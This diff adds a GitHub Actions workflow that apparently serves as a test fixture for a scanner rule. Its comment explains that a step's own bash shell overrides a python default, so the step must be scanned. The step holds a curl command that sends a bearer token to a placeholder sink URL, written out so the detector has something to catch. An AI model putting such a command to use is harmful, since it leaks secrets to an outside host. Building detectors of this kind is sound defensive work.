@@ -1,0 +1,15 @@
+# Rule E must fire ONCE. The job's defaults.run.shell is python, but THIS step names `shell: bash`:
+# the step's own shell wins over the default, so the body is bash and must be scanned.
+name: fixture-step-shell-over-default
+on: workflow_dispatch
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        shell: python
+    steps:
+      - name: bash step under a python default
+        shell: bash
+        run: |
+          curl --disable --noproxy '*' -sS -H "Authorization: Bearer ${FIXTURE_TOKEN}" "$SINK_URL"
